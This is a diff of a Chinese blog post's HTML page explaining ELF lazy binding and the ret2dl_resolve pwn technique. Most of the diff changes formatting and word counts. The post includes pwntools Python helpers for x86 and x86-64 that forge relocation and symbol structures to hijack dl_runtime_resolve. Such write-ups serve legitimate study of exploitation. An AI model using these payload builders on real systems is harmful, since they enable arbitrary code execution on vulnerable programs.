@@ -16,7 +16,7 @@
 
 <html class="theme-next mist use-motion" lang="zh-CN">
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="UTF-8">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
@@ -119,13 +119,13 @@
 
 
 
-  <meta name="description" content="动态链接数据基础程序分为静态链接跟动态链接,在处理动态链接程序时会采取延迟绑定(lazy binding)的技术.即位于动态链接库的函数被调用时才会确定函数在进程中的位置. 下面用一个x86程序分析. 123456789101112131415161718w4rd3n@cws:~/temp$ readelf -S pwn共有 31 个节头，从偏移量 0x17f0 开始：节头：  [Nr] Name">
+  <meta name="description" content="动态链接数据基础 程序分为静态链接跟动态链接,在处理动态链接程序时会采取延迟绑定(lazy binding)的技术.即位于动态链接库的函数被调用时才会确定函数在进程中的位置. 下面用一个x86程序分析. 123456789101112131415161718w4rd3n@cws:~/temp$ readelf -S pwn共有 31 个节头，从偏移量 0x17f0 开始：节头：  [Nr]">
 <meta name="keywords" content="Linux">
 <meta property="og:type" content="article">
 <meta property="og:title" content="IS-pwn-Linux-ret2dl_resolve">
 <meta property="og:url" content="https://hitworld.github.io/posts/94e4cc78/index.html">
 <meta property="og:site_name" content="w4rd3n">
-<meta property="og:description" content="动态链接数据基础程序分为静态链接跟动态链接,在处理动态链接程序时会采取延迟绑定(lazy binding)的技术.即位于动态链接库的函数被调用时才会确定函数在进程中的位置. 下面用一个x86程序分析. 123456789101112131415161718w4rd3n@cws:~/temp$ readelf -S pwn共有 31 个节头，从偏移量 0x17f0 开始：节头：  [Nr] Name">
+<meta property="og:description" content="动态链接数据基础 程序分为静态链接跟动态链接,在处理动态链接程序时会采取延迟绑定(lazy binding)的技术.即位于动态链接库的函数被调用时才会确定函数在进程中的位置. 下面用一个x86程序分析. 123456789101112131415161718w4rd3n@cws:~/temp$ readelf -S pwn共有 31 个节头，从偏移量 0x17f0 开始：节头：  [Nr]">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://hitworld.github.io/posts/94e4cc78/1.png">
 <meta property="og:image" content="https://hitworld.github.io/posts/94e4cc78/2.png">
@@ -133,7 +133,7 @@
 <meta property="og:updated_time" content="2020-08-09T06:34:17.816Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="IS-pwn-Linux-ret2dl_resolve">
-<meta name="twitter:description" content="动态链接数据基础程序分为静态链接跟动态链接,在处理动态链接程序时会采取延迟绑定(lazy binding)的技术.即位于动态链接库的函数被调用时才会确定函数在进程中的位置. 下面用一个x86程序分析. 123456789101112131415161718w4rd3n@cws:~/temp$ readelf -S pwn共有 31 个节头，从偏移量 0x17f0 开始：节头：  [Nr] Name">
+<meta name="twitter:description" content="动态链接数据基础 程序分为静态链接跟动态链接,在处理动态链接程序时会采取延迟绑定(lazy binding)的技术.即位于动态链接库的函数被调用时才会确定函数在进程中的位置. 下面用一个x86程序分析. 123456789101112131415161718w4rd3n@cws:~/temp$ readelf -S pwn共有 31 个节头，从偏移量 0x17f0 开始：节头：  [Nr]">
 <meta name="twitter:image" content="https://hitworld.github.io/posts/94e4cc78/1.png">
 
 
@@ -189,7 +189,7 @@
       .logo-line-after i { right: initial; }
     }
   </style>
-</noscript>
+</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 
 </head>
 
@@ -200,7 +200,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -507,7 +507,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">9.7k</span>
+                <span title="本文字数">9.8k</span>
               
 
               
@@ -541,11 +541,12 @@
       
 
       
-        <h2 id="动态链接数据基础"><a href="#动态链接数据基础" class="headerlink" title="动态链接数据基础"></a>动态链接数据基础</h2><p>程序分为静态链接跟动态链接,在处理动态链接程序时会采取延迟绑定(<code>lazy binding</code>)的技术.即位于动态链接库的函数被调用时才会确定函数在进程中的位置.</p>
+        <h2 id="动态链接数据基础">动态链接数据基础</h2>
+<p>程序分为静态链接跟动态链接,在处理动态链接程序时会采取延迟绑定(<code>lazy binding</code>)的技术.即位于动态链接库的函数被调用时才会确定函数在进程中的位置.</p>
 <p>下面用一个<code>x86</code>程序分析.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">w4rd3n@cws:~/temp$ readelf -S pwn</span><br><span class="line">共有 31 个节头，从偏移量 0x17f0 开始：</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  ...</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4  <span class="comment">#动态链接符号表</span></span><br><span class="line">  [ 6] .dynstr           STRTAB          0804821c 00021c 00004a 00   A  0   0  1  <span class="comment">#动态链接的字符串</span></span><br><span class="line">  ...</span><br><span class="line">  [ 9] .rel.dyn          REL             08048290 000290 000008 08   A  5   0  4  <span class="comment">#用于对数据引用的修正,修正的位置位于.got和数据段</span></span><br><span class="line">  [10] .rel.plt          REL             08048298 000298 000010 08  AI  5  24  4  <span class="comment">#用于对函数引用的修正,修正的位置位于.got.plt</span></span><br><span class="line">  ...</span><br><span class="line">  [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16  <span class="comment">#全局函数plt表,用于跳转,第一项用于解析函数地址</span></span><br><span class="line">  ...</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4  <span class="comment">#动态链接信息</span></span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4  <span class="comment">#全局变量偏移表</span></span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000014 04  WA  0   0  4  <span class="comment">#全局函数偏移表</span></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
 <p>其中<code>.got.plt</code>前三项不是全局函数偏移.</p>
-<ol>
+<ol type="1">
 <li><code>.dynamic</code>基址.</li>
 <li><code>link_map</code>结构体指针.</li>
 <li><code>dl_runtime_resolve</code>函数指针.</li>
@@ -559,7 +560,8 @@
 <p>符号对应的符号表信息<code>.dynsym[num]</code>中的<code>num</code>是通过<code>((r_info)&gt;&gt;8)</code>索引的,<code>r_info</code>为<code>.rel.plt</code>或<code>.rel.dyn</code>中的信息项的值.</p>
 <p>例如:<code>.dynsym</code>的地址为<code>0x80481cc</code>,<code>read</code>函数对应的<code>num</code>为<code>1</code>,查看一下<code>ndx name</code>为<code>read</code>处的内存.</p>
 <img src="/posts/94e4cc78/1.png" width="1">
-<h2 id="动态链接函数执行流程"><a href="#动态链接函数执行流程" class="headerlink" title="动态链接函数执行流程"></a>动态链接函数执行流程</h2><p>以<code>read</code>函数为例.<code>read</code>函数内容为.</p>
+<h2 id="动态链接函数执行流程">动态链接函数执行流程</h2>
+<p>以<code>read</code>函数为例.<code>read</code>函数内容为.</p>
 <img src="/posts/94e4cc78/2.png" width="2">
 <p><code>read</code>第一次调用时<code>0x804a00c</code>(对应的<code>.got.plt</code>表项)的值为<code>read@plt + 6</code>的地址.</p>
 <p>跳转后先将<code>0×0</code>压栈(即相对<code>.rel.plt</code>的偏移,因为<code>read</code>在<code>.rel.plt</code>中时第一个,所以偏移为<code>0</code>),又跳转到<code>0x80482d0</code>.</p>
@@ -567,7 +569,8 @@
 <p><code>0x804a004</code>为一个指向内部<code>link_map</code>结构的指针,在动态装载器内部使用.</p>
 <p><code>0x804a008</code>处为函数<code>dl_runtime_resolve(struct link_map *l, ElfW(Word) rel_offset)</code>.即调用函数<code>dl_runtime_resolve(link_map, 0×0)</code>,解析出地址,然后写到对应<code>.got.plt</code>并跳转执行.</p>
 <p><code>dl_runtime_resolve</code>调用<code>_dl_fixup</code>函数实现具体逻辑,最后解析出来的函数地址保存在<code>rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);</code>.</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>如果伪造<code>rel_offset</code>及对应的其他结构体,便可以执行任意函数.具体参考<code>_dl_fixup</code>源码.</p>
+<h2 id="利用">利用</h2>
+<p>如果伪造<code>rel_offset</code>及对应的其他结构体,便可以执行任意函数.具体参考<code>_dl_fixup</code>源码.</p>
 <p>如果<code>.dynamic</code>可写,将<code>.dynstr</code>地址改写为<code>.bss</code>地址,然后在<code>bss</code>段伪造目标函数的字符串.(偏移<code>0x44</code>)<code>.dynamic</code>不可写,可以将传入的<code>rel_offset</code>改为目标函数的偏移.</p>
 <p>但是<code>.rel.plt</code>中不一定存在目标函数,可以将<code>rel_offset</code>修改为一个比较大的值,在可控的<code>.rel.plt + rel_offset</code>处伪造一个<code>Elf32_Rel</code>结构.</p>
 <p>由<code>RELENT</code>可知,<code>.rel.plt</code>项大小为<code>8</code>字节.结构体定义如下.</p>
@@ -576,9 +579,11 @@
 <p>但这里存在一个问题,<code>index</code>过大会导致<code>ndx</code>过大从而导致段错误.</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line"><span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">  version = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
 <p>这个问题<code>x86</code>和<code>x86-64</code>有不同解决方案.</p>
-<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p><code>x86</code>通过可以通过构造<code>ndx</code>为<code>0</code>来绕过.</p>
+<h2 id="x86">x86</h2>
+<p><code>x86</code>通过可以通过构造<code>ndx</code>为<code>0</code>来绕过.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2dl_resolve_x86</span><span class="params">(path, stage, func, resolve_target)</span>:</span></span><br><span class="line">    elf = ELF(path)</span><br><span class="line">    plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">    jmprel = elf.dynamic_value_by_tag(<span class="string">"DT_JMPREL"</span>)<span class="comment">#rel_plt</span></span><br><span class="line">    relent = elf.dynamic_value_by_tag(<span class="string">"DT_RELENT"</span>)<span class="comment">#size of jmprel struct</span></span><br><span class="line">    symtab = elf.dynamic_value_by_tag(<span class="string">"DT_SYMTAB"</span>)<span class="comment">#dynsym</span></span><br><span class="line">    syment = elf.dynamic_value_by_tag(<span class="string">"DT_SYMENT"</span>)<span class="comment">#size of symtab</span></span><br><span class="line">    strtab = elf.dynamic_value_by_tag(<span class="string">"DT_STRTAB"</span>)<span class="comment">#dynstr</span></span><br><span class="line">    versym = elf.dynamic_value_by_tag(<span class="string">"DT_VERSYM"</span>)<span class="comment">#version</span></span><br><span class="line"></span><br><span class="line">    padlen = syment - ((stage - symtab) % syment)</span><br><span class="line">    fake_addr_sym = stage + padlen</span><br><span class="line"></span><br><span class="line">    fake_symbol_index = (fake_addr_sym - symtab) / syment</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        ndx = u16(elf.read(versym + fake_symbol_index * <span class="number">2</span>, <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">if</span> ndx != <span class="number">0</span>:</span><br><span class="line">            fake_symbol_index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    fake_addr_sym  = symtab + fake_symbol_index * syment</span><br><span class="line">    sym_padlen = fake_addr_sym - stage</span><br><span class="line"></span><br><span class="line">    stage = fake_addr_sym + syment</span><br><span class="line">    padlen = relent - ((stage - jmprel) % relent)</span><br><span class="line">    fake_addr_reloc = stage + padlen</span><br><span class="line">    padlen_reloc = padlen</span><br><span class="line"></span><br><span class="line">    fake_addr_symstr = fake_addr_reloc + relent</span><br><span class="line">    r_info = (((fake_addr_sym - symtab) / syment) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">    fake_st_name = fake_addr_symstr - strtab</span><br><span class="line"></span><br><span class="line">    resolve_data = <span class="string">"S"</span> * sym_padlen</span><br><span class="line">    resolve_data += struct.pack(<span class="string">'&lt;IIII'</span>, fake_st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>)<span class="comment">#Elf32_Sym</span></span><br><span class="line">    resolve_data += <span class="string">"S"</span> * padlen_reloc</span><br><span class="line">    resolve_data += struct.pack(<span class="string">'&lt;II'</span>, resolve_target, r_info)<span class="comment">#Elf32_Rel</span></span><br><span class="line">    resolve_data += func</span><br><span class="line"></span><br><span class="line">    fake_reloc_offset = fake_addr_reloc - jmprel</span><br><span class="line">    resovle_call = p32(plt0) + p32(fake_reloc_offset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resolve_data, resovle_call</span><br></pre></td></tr></table></figure>
-<h2 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h2><p>基本原理与<code>32bit</code>相同.只是一些结构体发生变化,参数传递方式也不一样.然后绕过<code>version</code>方式变成了使<code>link_map + 0x1c8</code>为<code>NULL</code>.</p>
+<h2 id="x86-64">x86-64</h2>
+<p>基本原理与<code>32bit</code>相同.只是一些结构体发生变化,参数传递方式也不一样.然后绕过<code>version</code>方式变成了使<code>link_map + 0x1c8</code>为<code>NULL</code>.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://github.com/inaz2/roputils/blob/master/roputils.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dl_resolve_data</span><span class="params">(self, base, name)</span>:</span></span><br><span class="line">  jmprel = self.dynamic(<span class="string">'JMPREL'</span>)</span><br><span class="line">  relaent = self.dynamic(<span class="string">'RELAENT'</span>)</span><br><span class="line">  symtab = self.dynamic(<span class="string">'SYMTAB'</span>)</span><br><span class="line">  syment = self.dynamic(<span class="string">'SYMENT'</span>)</span><br><span class="line">  strtab = self.dynamic(<span class="string">'STRTAB'</span>)</span><br><span class="line"></span><br><span class="line">  addr_reloc, padlen_reloc = self.align(base, jmprel, relaent)</span><br><span class="line">  addr_sym, padlen_sym = self.align(addr_reloc + relaent, symtab, syment)</span><br><span class="line">  addr_symstr = addr_sym + syment</span><br><span class="line"></span><br><span class="line">  r_info = (((addr_sym - symtab) / syment) &lt;&lt; <span class="number">32</span>) | <span class="number">0x7</span></span><br><span class="line">  st_name = addr_symstr - strtab</span><br><span class="line"></span><br><span class="line">  buf = self.fill(padlen_reloc)</span><br><span class="line">  buf += struct.pack(<span class="string">'&lt;QQQ'</span>, base, r_info, <span class="number">0</span>)</span><br><span class="line">  buf += self.fill(padlen_sym)</span><br><span class="line">  buf += struct.pack(<span class="string">'&lt;IIQQ'</span>, st_name, <span class="number">0x12</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">  buf += self.string(name)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dl_resolve_call</span><span class="params">(self, base, *args)</span>:</span></span><br><span class="line">  <span class="comment">#覆盖link_map + 0x1c8为NULL</span></span><br><span class="line">  <span class="comment">#参数自行设置</span></span><br><span class="line">  <span class="keyword">if</span> args:</span><br><span class="line">      <span class="keyword">raise</span> Exception(<span class="string">'arguments must be set to the registers beforehand'</span>)</span><br><span class="line"></span><br><span class="line">  jmprel = self.dynamic(<span class="string">'JMPREL'</span>)</span><br><span class="line">  relaent = self.dynamic(<span class="string">'RELAENT'</span>)</span><br><span class="line"></span><br><span class="line">  addr_reloc, padlen_reloc = self.align(base, jmprel, relaent)</span><br><span class="line">  reloc_offset = (addr_reloc - jmprel) / relaent</span><br><span class="line"></span><br><span class="line">  buf = self.p(self.plt())</span><br><span class="line">  buf += self.p(reloc_offset)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> buf</span><br></pre></td></tr></table></figure>
 <p>但这种利用需要泄露,所以不太实用.</p>
 <p>查看<code>_dl_fixup</code>源码可发现,当对应的<code>.dynsym</code>节中<code>Elf32_Sym</code>结构的<code>st_other</code>值为非<code>0</code>时,会进入另一个分支.</p>
@@ -937,7 +942,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">710k</span>
+    <span title="站点总字数">720k</span>
   
 
   
@@ -946,7 +951,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">10:46</span>
+    <span title="站点阅读时长">10:54</span>
   
 </div>
 
@@ -1597,5 +1602,5 @@
   
   <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
   
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
 </html>
